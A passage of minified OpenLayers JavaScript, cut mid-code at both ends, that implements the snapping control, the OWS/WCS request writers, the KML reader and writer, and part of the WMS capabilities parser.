c={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY,x:null,y:null},d=!1,e,f,g=0,h=this.targets.length;g&lt;h;++g)if(f=this.targets[g],e=this.testTarget(f,b))if(this.greedy){c=e;c.target=f;d=!0;break}else if(e.rank&lt;c.rank||e.rank===c.rank&amp;&amp;e.dist&lt;c.dist)c=e,c.target=f,d=!0;d&amp;&amp;(!1!==this.events.triggerEvent("beforesnap", {point:a,x:c.x,y:c.y,distance:c.dist,layer:c.target.layer,snapType:this.precedence[c.rank]})?(a.x=c.x,a.y=c.y,this.point=a,this.events.triggerEvent("snap",{point:a,snapType:this.precedence[c.rank],layer:c.target.layer,distance:c.dist})):d=!1);this.point&amp;&amp;!d&amp;&amp;(a.x=b.x,a.y=b.y,this.point=null,this.events.triggerEvent("unsnap",{point:a}))},testTarget:function(a,b){var c=this.layer.map.getResolution();if("minResolution"in a&amp;&amp;c&lt;a.minResolution||"maxResolution"in a&amp;&amp;c>=a.maxResolution)return null;for(var c= {node:this.getGeoTolerance(a.nodeTolerance,c),vertex:this.getGeoTolerance(a.vertexTolerance,c),edge:this.getGeoTolerance(a.edgeTolerance,c)},d=Math.max(c.node,c.vertex,c.edge),e={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY},f=!1,g=a.layer.features,h,k,l,m,n,p,q=this.precedence.length,r=new OpenLayers.LonLat(b.x,b.y),s=0,t=g.length;s&lt;t;++s)if(h=g[s],h!==this.feature&amp;&amp;(!h._sketch&amp;&amp;h.state!==OpenLayers.State.DELETE&amp;&amp;(!a.filter||a.filter.evaluate(h)))&amp;&amp;h.atPoint(r,d,d))for(var u=0,v=Math.min(e.rank+ 1,q);u&lt;v;++u)if(k=this.precedence[u],a[k])if("edge"===k){if(l=h.geometry.distanceTo(b,{details:!0}),n=l.distance,n&lt;=c[k]&amp;&amp;n&lt;e.dist){e={rank:u,dist:n,x:l.x0,y:l.y0};f=!0;break}}else{l=h.geometry.getVertices("node"===k);p=!1;for(var w=0,x=l.length;w&lt;x;++w)m=l[w],n=m.distanceTo(b),n&lt;=c[k]&amp;&amp;(u&lt;e.rank||u===e.rank&amp;&amp;n&lt;e.dist)&amp;&amp;(e={rank:u,dist:n,x:m.x,y:m.y},p=f=!0);if(p)break}return f?e:null},getGeoTolerance:function(a,b){b!==this.resolution&amp;&amp;(this.resolution=b,this.geoToleranceCache={});var c=this.geoToleranceCache[a]; void 0===c&amp;&amp;(c=a*b,this.geoToleranceCache[a]=c);return c},destroy:function(){this.active&amp;&amp;this.deactivate();delete this.layer;delete this.targets;OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:"OpenLayers.Control.Snapping"});OpenLayers.Format.OWSCommon.v1_1_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:"http://www.opengis.net/ows/1.1",xlink:"http://www.w3.org/1999/xlink"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.exceptionReport={version:a.getAttribute("version"),language:a.getAttribute("xml:lang"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)},AllowedValues:function(a,b){b.allowedValues={};this.readChildNodes(a,b.allowedValues)},AnyValue:function(a,b){b.anyValue= !0},DataType:function(a,b){b.dataType=this.getChildValue(a)},Range:function(a,b){b.range={};this.readChildNodes(a,b.range)},MinimumValue:function(a,b){b.minValue=this.getChildValue(a)},MaximumValue:function(a,b){b.maxValue=this.getChildValue(a)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},SupportedCRS:function(a,b){b.supportedCRS=this.getChildValue(a)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Util.applyDefaults({Range:function(a){var b=this.createElementNSPlus("ows:Range", {attributes:{"ows:rangeClosure":a.closure}});this.writeNode("ows:MinimumValue",a.minValue,b);this.writeNode("ows:MaximumValue",a.maxValue,b);return b},MinimumValue:function(a){return this.createElementNSPlus("ows:MinimumValue",{value:a})},MaximumValue:function(a){return this.createElementNSPlus("ows:MaximumValue",{value:a})},Value:function(a){return this.createElementNSPlus("ows:Value",{value:a})}},OpenLayers.Format.OWSCommon.v1.prototype.writers.ows)},CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_1_0"});OpenLayers.Format.WCSGetCoverage=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows/1.1",wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.1.2",schemaLocation:"http://www.opengis.net/wcs/1.1 http://schemas.opengis.net/wcs/1.1/wcsGetCoverage.xsd",write:function(a){a=this.writeNode("wcs:GetCoverage", a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{wcs:{GetCoverage:function(a){var b=this.createElementNSPlus("wcs:GetCoverage",{attributes:{version:a.version||this.VERSION,service:"WCS"}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wcs:DomainSubset",a.domainSubset,b);this.writeNode("wcs:Output",a.output,b);return b},DomainSubset:function(a){var b=this.createElementNSPlus("wcs:DomainSubset", {});this.writeNode("ows:BoundingBox",a.boundingBox,b);a.temporalSubset&amp;&amp;this.writeNode("wcs:TemporalSubset",a.temporalSubset,b);return b},TemporalSubset:function(a){for(var b=this.createElementNSPlus("wcs:TemporalSubset",{}),c=0,d=a.timePeriods.length;c&lt;d;++c)this.writeNode("wcs:TimePeriod",a.timePeriods[c],b);return b},TimePeriod:function(a){var b=this.createElementNSPlus("wcs:TimePeriod",{});this.writeNode("wcs:BeginPosition",a.begin,b);this.writeNode("wcs:EndPosition",a.end,b);a.resolution&amp;&amp;this.writeNode("wcs:TimeResolution", a.resolution,b);return b},BeginPosition:function(a){return this.createElementNSPlus("wcs:BeginPosition",{value:a})},EndPosition:function(a){return this.createElementNSPlus("wcs:EndPosition",{value:a})},TimeResolution:function(a){return this.createElementNSPlus("wcs:TimeResolution",{value:a})},Output:function(a){var b=this.createElementNSPlus("wcs:Output",{attributes:{format:a.format,store:a.store}});a.gridCRS&amp;&amp;this.writeNode("wcs:GridCRS",a.gridCRS,b);return b},GridCRS:function(a){var b=this.createElementNSPlus("wcs:GridCRS", {});this.writeNode("wcs:GridBaseCRS",a.baseCRS,b);a.type&amp;&amp;this.writeNode("wcs:GridType",a.type,b);a.origin&amp;&amp;this.writeNode("wcs:GridOrigin",a.origin,b);this.writeNode("wcs:GridOffsets",a.offsets,b);a.CS&amp;&amp;this.writeNode("wcs:GridCS",a.CS,b);return b},GridBaseCRS:function(a){return this.createElementNSPlus("wcs:GridBaseCRS",{value:a})},GridOrigin:function(a){return this.createElementNSPlus("wcs:GridOrigin",{value:a})},GridType:function(a){return this.createElementNSPlus("wcs:GridType",{value:a})},GridOffsets:function(a){return this.createElementNSPlus("wcs:GridOffsets", {value:a})},GridCS:function(a){return this.createElementNSPlus("wcs:GridCS",{value:a})}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},CLASS_NAME:"OpenLayers.Format.WCSGetCoverage"});OpenLayers.Format.KML=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{kml:"http://www.opengis.net/kml/2.2",gx:"http://www.google.com/kml/ext/2.2"},kmlns:"http://earth.google.com/kml/2.0",placemarksDesc:"No description available",foldersName:"OpenLayers export",foldersDesc:"Exported on "+new Date,extractAttributes:!0,kvpAttributes:!1,extractStyles:!1,extractTracks:!1,trackAttributes:null,internalns:null,features:null,styles:null,styleBaseUrl:"",fetched:null,maxDepth:0,initialize:function(a){this.regExes= {trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,kmlColor:/(\w{2})(\w{2})(\w{2})(\w{2})/,kmlIconPalette:/root:\/\/icons\/palette-(\d+)(\.\w+)/,straightBracket:/\$\[(.*?)\]/g};this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){this.features=[];this.styles={};this.fetched={};return this.parseData(a,{depth:0,styleBaseUrl:this.styleBaseUrl})},parseData:function(a,b){"string"==typeof a&amp;&amp; (a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var c=["Link","NetworkLink","Style","StyleMap","Placemark"],d=0,e=c.length;d&lt;e;++d){var f=c[d],g=this.getElementsByTagNameNS(a,"*",f);if(0!=g.length)switch(f.toLowerCase()){case "link":case "networklink":this.parseLinks(g,b);break;case "style":this.extractStyles&amp;&amp;this.parseStyles(g,b);break;case "stylemap":this.extractStyles&amp;&amp;this.parseStyleMaps(g,b);break;case "placemark":this.parseFeatures(g,b)}}return this.features},parseLinks:function(a, b){if(b.depth>=this.maxDepth)return!1;var c=OpenLayers.Util.extend({},b);c.depth++;for(var d=0,e=a.length;d&lt;e;d++){var f=this.parseProperty(a[d],"*","href");f&amp;&amp;!this.fetched[f]&amp;&amp;(this.fetched[f]=!0,(f=this.fetchLink(f))&amp;&amp;this.parseData(f,c))}},fetchLink:function(a){if(a=OpenLayers.Request.GET({url:a,async:!1}))return a.responseText},parseStyles:function(a,b){for(var c=0,d=a.length;c&lt;d;c++){var e=this.parseStyle(a[c]);e&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e.id]=e)}},parseKmlColor:function(a){var b= null;a&amp;&amp;(a=a.match(this.regExes.kmlColor))&amp;&amp;(b={color:"#"+a[4]+a[3]+a[2],opacity:parseInt(a[1],16)/255});return b},parseStyle:function(a){for(var b={},c=["LineStyle","PolyStyle","IconStyle","BalloonStyle","LabelStyle"],d,e,f=0,g=c.length;f&lt;g;++f)if(d=c[f],e=this.getElementsByTagNameNS(a,"*",d)[0])switch(d.toLowerCase()){case "linestyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.strokeColor=d.color,b.strokeOpacity=d.opacity;(d=this.parseProperty(e,"*","width"))&amp;&amp;(b.strokeWidth= d);break;case "polystyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.fillOpacity=d.opacity,b.fillColor=d.color;"0"==this.parseProperty(e,"*","fill")&amp;&amp;(b.fillColor="none");"0"==this.parseProperty(e,"*","outline")&amp;&amp;(b.strokeWidth="0");break;case "iconstyle":var h=parseFloat(this.parseProperty(e,"*","scale")||1);d=32*h;var k=32*h,l=this.getElementsByTagNameNS(e,"*","Icon")[0];if(l){var m=this.parseProperty(l,"*","href");if(m){var n=this.parseProperty(l,"*","w"),p=this.parseProperty(l, "*","h");!OpenLayers.String.startsWith(m,"http://maps.google.com/mapfiles/kml")||(n||p)||(p=n=64,h/=2);n=n||p;p=p||n;n&amp;&amp;(d=parseInt(n)*h);p&amp;&amp;(k=parseInt(p)*h);if(p=m.match(this.regExes.kmlIconPalette))n=p[1],p=p[2],m=this.parseProperty(l,"*","x"),l=this.parseProperty(l,"*","y"),m="http://maps.google.com/mapfiles/kml/pal"+n+"/icon"+(8*(l?7-l/32:7)+(m?m/32:0))+p;b.graphicOpacity=1;b.externalGraphic=m}}if(e=this.getElementsByTagNameNS(e,"*","hotSpot")[0])m=parseFloat(e.getAttribute("x")),l=parseFloat(e.getAttribute("y")), n=e.getAttribute("xunits"),"pixels"==n?b.graphicXOffset=-m*h:"insetPixels"==n?b.graphicXOffset=-d+m*h:"fraction"==n&amp;&amp;(b.graphicXOffset=-d*m),e=e.getAttribute("yunits"),"pixels"==e?b.graphicYOffset=-k+l*h+1:"insetPixels"==e?b.graphicYOffset=-(l*h)+1:"fraction"==e&amp;&amp;(b.graphicYOffset=-k*(1-l)+1);b.graphicWidth=d;b.graphicHeight=k;break;case "balloonstyle":(e=OpenLayers.Util.getXmlNodeValue(e))&amp;&amp;(b.balloonStyle=e.replace(this.regExes.straightBracket,"${$1}"));break;case "labelstyle":if(d=this.parseProperty(e, "*","color"),d=this.parseKmlColor(d))b.fontColor=d.color,b.fontOpacity=d.opacity}!b.strokeColor&amp;&amp;b.fillColor&amp;&amp;(b.strokeColor=b.fillColor);(a=a.getAttribute("id"))&amp;&amp;b&amp;&amp;(b.id=a);return b},parseStyleMaps:function(a,b){for(var c=0,d=a.length;c&lt;d;c++)for(var e=a[c],f=this.getElementsByTagNameNS(e,"*","Pair"),e=e.getAttribute("id"),g=0,h=f.length;g&lt;h;g++){var k=f[g],l=this.parseProperty(k,"*","key");(k=this.parseProperty(k,"*","styleUrl"))&amp;&amp;"normal"==l&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e]=this.styles[(b.styleBaseUrl|| "")+k])}},parseFeatures:function(a,b){for(var c=[],d=0,e=a.length;d&lt;e;d++){var f=a[d],g=this.parseFeature.apply(this,[f]);if(g){this.extractStyles&amp;&amp;(g.attributes&amp;&amp;g.attributes.styleUrl)&amp;&amp;(g.style=this.getStyle(g.attributes.styleUrl,b));if(this.extractStyles){var h=this.getElementsByTagNameNS(f,"*","Style")[0];h&amp;&amp;(h=this.parseStyle(h))&amp;&amp;(g.style=OpenLayers.Util.extend(g.style,h))}this.extractTracks?(f=this.getElementsByTagNameNS(f,this.namespaces.gx,"Track"))&amp;&amp;0&lt;f.length&amp;&amp;(g={features:[],feature:g}, this.readNode(f[0],g),0&lt;g.features.length&amp;&amp;c.push.apply(c,g.features)):c.push(g)}else throw"Bad Placemark: "+d;}this.features=this.features.concat(c)},readers:{kml:{when:function(a,b){b.whens.push(OpenLayers.Date.parse(this.getChildValue(a)))},_trackPointAttribute:function(a,b){var c=a.nodeName.split(":").pop();b.attributes[c].push(this.getChildValue(a))}},gx:{Track:function(a,b){var c={whens:[],points:[],angles:[]};if(this.trackAttributes){var d;c.attributes={};for(var e=0,f=this.trackAttributes.length;e&lt; f;++e)d=this.trackAttributes[e],c.attributes[d]=[],d in this.readers.kml||(this.readers.kml[d]=this.readers.kml._trackPointAttribute)}this.readChildNodes(a,c);if(c.whens.length!==c.points.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:coord ("+c.points.length+") elements.");var g=0&lt;c.angles.length;if(g&amp;&amp;c.whens.length!==c.angles.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:angles ("+c.angles.length+") elements.");for(var h, e=0,f=c.whens.length;e&lt;f;++e){h=b.feature.clone();h.fid=b.feature.fid||b.feature.id;d=c.points[e];h.geometry=d;"z"in d&amp;&amp;(h.attributes.altitude=d.z);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.geometry.transform(this.externalProjection,this.internalProjection);if(this.trackAttributes)for(var k=0,l=this.trackAttributes.length;k&lt;l;++k)d=this.trackAttributes[k],h.attributes[d]=c.attributes[d][e];h.attributes.when=c.whens[e];h.attributes.trackId=b.feature.id;g&amp;&amp;(d=c.angles[e],h.attributes.heading= parseFloat(d[0]),h.attributes.tilt=parseFloat(d[1]),h.attributes.roll=parseFloat(d[2]));b.features.push(h)}},coord:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/),d=new OpenLayers.Geometry.Point(c[0],c[1]);2&lt;c.length&amp;&amp;(d.z=parseFloat(c[2]));b.points.push(d)},angles:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/);b.angles.push(c)}}},parseFeature:function(a){for(var b=["MultiGeometry","Polygon","LineString","Point"], c,d,e,f=0,g=b.length;f&lt;g;++f)if(c=b[f],this.internalns=a.namespaceURI?a.namespaceURI:this.kmlns,d=this.getElementsByTagNameNS(a,this.internalns,c),0&lt;d.length){if(b=this.parseGeometry[c.toLowerCase()])e=b.apply(this,[d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break}var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));c=new OpenLayers.Feature.Vector(e,h);a=a.getAttribute("id")|| a.getAttribute("name");null!=a&amp;&amp;(c.fid=a);return c},getStyle:function(a,b){var c=OpenLayers.Util.removeTail(a),d=OpenLayers.Util.extend({},b);d.depth++;d.styleBaseUrl=c;!this.styles[a]&amp;&amp;!OpenLayers.String.startsWith(a,"#")&amp;&amp;d.depth&lt;=this.maxDepth&amp;&amp;!this.fetched[c]&amp;&amp;(c=this.fetchLink(c))&amp;&amp;this.parseData(c,d);return OpenLayers.Util.extend({},this.styles[a])},parseGeometry:{point:function(a){var b=this.getElementsByTagNameNS(a,this.internalns,"coordinates");a=[];if(0&lt;b.length){var c=b[0].firstChild.nodeValue, c=c.replace(this.regExes.removeSpace,"");a=c.split(",")}b=null;if(1&lt;a.length)2==a.length&amp;&amp;(a[2]=null),b=new OpenLayers.Geometry.Point(a[0],a[1],a[2]);else throw"Bad coordinate string: "+c;return b},linestring:function(a,b){var c=this.getElementsByTagNameNS(a,this.internalns,"coordinates"),d=null;if(0&lt;c.length){for(var c=this.getChildValue(c[0]),c=c.replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),d=c.split(this.regExes.splitSpace),e=d.length,f=Array(e),g,h,k=0;k&lt;e;++k)if(g= d[k].split(","),h=g.length,1&lt;h)2==g.length&amp;&amp;(g[2]=null),f[k]=new OpenLayers.Geometry.Point(g[0],g[1],g[2]);else throw"Bad LineString point coordinates: "+d[k];if(e)d=b?new OpenLayers.Geometry.LinearRing(f):new OpenLayers.Geometry.LineString(f);else throw"Bad LineString coordinates: "+c;}return d},polygon:function(a){a=this.getElementsByTagNameNS(a,this.internalns,"LinearRing");var b=a.length,c=Array(b);if(0&lt;b)for(var d=0,e=a.length;d&lt;e;++d)if(b=this.parseGeometry.linestring.apply(this,[a[d],!0]))c[d]= b;else throw"Bad LinearRing geometry: "+d;return new OpenLayers.Geometry.Polygon(c)},multigeometry:function(a){for(var b,c=[],d=a.childNodes,e=0,f=d.length;e&lt;f;++e)a=d[e],1==a.nodeType&amp;&amp;(b=a.prefix?a.nodeName.split(":")[1]:a.nodeName,(b=this.parseGeometry[b.toLowerCase()])&amp;&amp;c.push(b.apply(this,[a])));return new OpenLayers.Geometry.Collection(c)}},parseAttributes:function(a){var b={},c=a.getElementsByTagName("ExtendedData");c.length&amp;&amp;(b=this.parseExtendedData(c[0]));var d,e,f;a=a.childNodes;for(var c= 0,g=a.length;c&lt;g;++c)if(d=a[c],1==d.nodeType&amp;&amp;(e=d.childNodes,1&lt;=e.length&amp;&amp;3>=e.length)){switch(e.length){case 1:f=e[0];break;case 2:f=e[0];e=e[1];f=3==f.nodeType||4==f.nodeType?f:e;break;default:f=e[1]}if(3==f.nodeType||4==f.nodeType)if(d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,f=OpenLayers.Util.getXmlNodeValue(f))f=f.replace(this.regExes.trimSpace,""),b[d]=f}return b},parseExtendedData:function(a){var b={},c,d,e,f,g=a.getElementsByTagName("Data");c=0;for(d=g.length;c&lt;d;c++){e=g[c];f=e.getAttribute("name"); var h={},k=e.getElementsByTagName("value");k.length&amp;&amp;(h.value=this.getChildValue(k[0]));this.kvpAttributes?b[f]=h.value:(e=e.getElementsByTagName("displayName"),e.length&amp;&amp;(h.displayName=this.getChildValue(e[0])),b[f]=h)}a=a.getElementsByTagName("SimpleData");c=0;for(d=a.length;c&lt;d;c++)h={},e=a[c],f=e.getAttribute("name"),h.value=this.getChildValue(e),this.kvpAttributes?b[f]=h.value:(h.displayName=f,b[f]=h);return b},parseProperty:function(a,b,c){var d;a=this.getElementsByTagNameNS(a,b,c);try{d=OpenLayers.Util.getXmlNodeValue(a[0])}catch(e){d= null}return d},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS(this.kmlns,"kml"),c=this.createFolderXML(),d=0,e=a.length;d&lt;e;++d)c.appendChild(this.createPlacemarkXML(a[d]));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFolderXML:function(){var a=this.createElementNS(this.kmlns,"Folder");if(this.foldersName){var b=this.createElementNS(this.kmlns,"name"),c=this.createTextNode(this.foldersName);b.appendChild(c);a.appendChild(b)}this.foldersDesc&amp;&amp; (b=this.createElementNS(this.kmlns,"description"),c=this.createTextNode(this.foldersDesc),b.appendChild(c),a.appendChild(b));return a},createPlacemarkXML:function(a){var b=this.createElementNS(this.kmlns,"name"),c=a.style&amp;&amp;a.style.label?a.style.label:a.id;b.appendChild(this.createTextNode(a.attributes.name||c));var d=this.createElementNS(this.kmlns,"description");d.appendChild(this.createTextNode(a.attributes.description||this.placemarksDesc));c=this.createElementNS(this.kmlns,"Placemark");null!= a.fid&amp;&amp;c.setAttribute("id",a.fid);c.appendChild(b);c.appendChild(d);b=this.buildGeometryNode(a.geometry);c.appendChild(b);a.attributes&amp;&amp;(a=this.buildExtendedData(a.attributes))&amp;&amp;c.appendChild(a);return c},buildGeometryNode:function(a){var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1),b=this.buildGeometry[b.toLowerCase()],c=null;b&amp;&amp;(c=b.apply(this,[a]));return c},buildGeometry:{point:function(a){var b=this.createElementNS(this.kmlns,"Point");b.appendChild(this.buildCoordinatesNode(a));return b}, multipoint:function(a){return this.buildGeometry.collection.apply(this,[a])},linestring:function(a){var b=this.createElementNS(this.kmlns,"LineString");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){return this.buildGeometry.collection.apply(this,[a])},linearring:function(a){var b=this.createElementNS(this.kmlns,"LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.kmlns,"Polygon");a=a.components; for(var c,d,e=0,f=a.length;e&lt;f;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.kmlns,c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){return this.buildGeometry.collection.apply(this,[a])},collection:function(a){for(var b=this.createElementNS(this.kmlns,"MultiGeometry"),c,d=0,e=a.components.length;d&lt;e;++d)(c=this.buildGeometryNode.apply(this,[a.components[d]]))&amp;&amp;b.appendChild(c);return b}},buildCoordinatesNode:function(a){var b= this.createElementNS(this.kmlns,"coordinates"),c;if(c=a.components){for(var d=c.length,e=Array(d),f=0;f&lt;d;++f)a=c[f],e[f]=this.buildCoordinates(a);c=e.join(" ")}else c=this.buildCoordinates(a);c=this.createTextNode(c);b.appendChild(c);return b},buildCoordinates:function(a){this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return a.x+","+a.y},buildExtendedData:function(a){var b=this.createElementNS(this.kmlns,"ExtendedData"), c;for(c in a)if(a[c]&amp;&amp;"name"!=c&amp;&amp;"description"!=c&amp;&amp;"styleUrl"!=c){var d=this.createElementNS(this.kmlns,"Data");d.setAttribute("name",c);var e=this.createElementNS(this.kmlns,"value");if("object"==typeof a[c]){if(a[c].value&amp;&amp;e.appendChild(this.createTextNode(a[c].value)),a[c].displayName){var f=this.createElementNS(this.kmlns,"displayName");f.appendChild(this.getXMLDoc().createCDATASection(a[c].displayName));d.appendChild(f)}}else e.appendChild(this.createTextNode(a[c]));d.appendChild(e);b.appendChild(d)}return this.isSimpleContent(b)? null:b},CLASS_NAME:"OpenLayers.Format.KML"});OpenLayers.Format.WMSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.1",profile:null,CLASS_NAME:"OpenLayers.Format.WMSCapabilities"});OpenLayers.Format.WMSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wms:"http://www.opengis.net/wms",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"wms",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a;a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c={};this.readNode(a,c);void 0===c.service&amp;&amp;(a=new OpenLayers.Format.OGCExceptionReport,c.error=a.read(b));return c},readers:{wms:{Service:function(a, b){b.service={};this.readChildNodes(a,b.service)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},BoundingBox:function(a,b){var c={};c.bbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")),parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))];var d={x:parseFloat(a.getAttribute("resx")),y:parseFloat(a.getAttribute("resy"))};isNaN(d.x)&amp;&amp;isNaN(d.y)||(c.res= d);return c},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")},ContactInformation:function(a,b){b.contactInformation={};this.readChildNodes(a,b.contactInformation)},ContactPersonPrimary:function(a,b){b.personPrimary={};this.readChildNodes(a,b.personPrimary)},ContactPerson:function(a,b){b.person=this.getChildValue(a)},ContactOrganization:function(a,b){b.organization=this.getChildValue(a)},ContactPosition:function(a,b){b.position=this.getChildValue(a)},ContactAddress:function(a, b){b.contactAddress={};this.readChildNodes(a,b.contactAddress)},AddressType:function(a,b){b.type=this.getChildValue(a)},Address:function(a,b){b.address=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},StateOrProvince:function(a,b){b.stateOrProvince=this.getChildValue(a)},PostCode:function(a,b){b.postcode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ContactVoiceTelephone:function(a,b){b.phone=this.getChildValue(a)},ContactFacsimileTelephone:function(a, b){b.fax=this.getChildValue(a)},ContactElectronicMailAddress:function(a,b){b.email=this.getChildValue(a)},Fees:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)},Capability:function(a,b){b.capability={nestedLayers:[],layers:[]};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetCapabilities:function(a, b){b.getcapabilities={formats:[]};this.readChildNodes(a,b.getcapabilities)},Format:function(a,b){OpenLayers.Util.isArray(b.formats)?b.formats.push(this.getChildValue(a)):b.format=this.getChildValue(a)},DCPType:function(a,b){this.readChildNodes(a,b)},HTTP:function(a,b){this.readChildNodes(a,b)},Get:function(a,b){b.get={};this.readChildNodes(a,b.get);b.href||(b.href=b.get.href)},Post:function(a,b){b.post={};this.readChildNodes(a,b.post);b.href||(b.href=b.get.href)},GetMap:function(a,b){b.getmap={formats:[]}; this.readChildNodes(a,b.getmap)},GetFeatureInfo:function(a,b){b.getfeatureinfo={formats:[]};this.readChildNodes(a,b.getfeatureinfo)},Exception:function(a,b){b.exception={formats:[]};this.readChildNodes(a,b.exception)},Layer:function(a,b){var c,d;b.capability?(d=b.capability,c=b):d=b;var e=a.getAttributeNode("queryable"),f=e&amp;&amp;e.specified?a.getAttribute("queryable"):null,g=(e=a.getAttributeNode("cascaded"))&amp;&amp;e.specified?a.getAttribute("cascaded"):null,e=(e=a.getAttributeNode("opaque"))&amp;&amp;e.specified? a.getAttribute("opaque"):null,h=a.getAttribute("noSubsets"),k=a.getAttribute("fixedWidth"),l=a.getAttribute("fixedHeight"),m=c||{},n=OpenLayers.Util.extend;c={nestedLayers:[],styles:c?[].concat(c.styles):[],srs:c?n({},m.srs):{},metadataURLs:[],bbox:c?n({},m.bbox):{},llbbox:m.llbbox,dimensions:c?n({},m.dimensions):{},authorityURLs:c?n({},m.authorityURLs):{},identifiers:{},keywords:[],queryable:f&amp;&amp;""!==f?"1"===f||"true"===f:m.queryable||!1,cascaded:null!==g?parseInt(g):m.cascaded||0,opaque:e?"1"=== e||"true"===e:m.opaque||!1,noSubsets:null!==h?"1"===h||"true"===h:m.noSubsets||!1,fixedWidth:null!=k?parseInt(k):m.fixedWidth||0,fixedHeight:null!=l?parseInt(l):m.fixedHeight||0,minScale:m.minScale,maxScale:m.maxScale,attribution:m.attribution};b.nestedLayers.push(c);c.capability=d;this.readChildNodes(a,c);delete c.capability;c.name&amp;&amp;(f=c.name.split(":"),g=d.request,e=g.getfeatureinfo,0&lt;f.length&amp;&amp;(c.prefix=f[0]),d.layers.push(c),void 0===c.formats&amp;&amp;(c.formats=g.getmap.formats),void 0===c.infoFormats&amp;&amp; e&amp;&amp;(c.infoFormats=e.formats))},Attribution:function(a,b){b.attribution={};this.readChildNodes(a,b.attribution)},LogoURL:function(a,b){b.logo={width:a.getAttribute("width"),height:a.getAttribute("height")};this.readChildNodes(a,b.logo)},Style:function(a,b){var c={};b.styles.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={width:a.getAttribute("width"),height:a.getAttribute("height")};b.legend=c;this.readChildNodes(a,c)},MetadataURL:function(a,b){var c={type:a.getAttribute("type")}; b.metadataURLs.push(c);this.readChildNodes(a,c)},DataURL:function(a,b){b.dataURL={};this.readChildNodes(a,b.dataURL)},FeatureListURL:function(a,b){b.featureListURL={};this.readChildNodes(a,b.featureListURL)},AuthorityURL:function(a,b){var c=a.getAttribute("name"),d={};this.readChildNodes(a,d);b.authorityURLs[c]=d.href},Identifier:function(a,b){var c=a.getAttribute("authority");b.identifiers[c]=this.getChildValue(a)},KeywordList:function(a,b){this.readChildNodes(a,b)},SRS:function(a,b){b.srs[this.getChildValue(a)]= 